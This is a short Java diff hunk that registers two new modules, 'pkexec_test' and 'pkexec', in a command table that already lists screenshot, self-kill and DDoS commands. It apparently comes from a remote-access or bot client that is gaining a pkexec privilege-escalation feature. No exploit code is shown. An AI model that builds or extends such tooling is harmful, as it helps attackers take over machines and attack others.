@@ -24,6 +24,8 @@ public class Modules {
         this.modules.put("screenshot", new ScreenShotCommand(exs));
         this.modules.put("selfkill", new SelfKillCommand());
         this.modules.put("ddos", new DdosCommand());
+        this.modules.put("pkexec_test", new PKExecPETestCommand());
+        this.modules.put("pkexec", new PKExecPECommand());
 
         try {
             if ((new File(this.store_file)).exists()) {
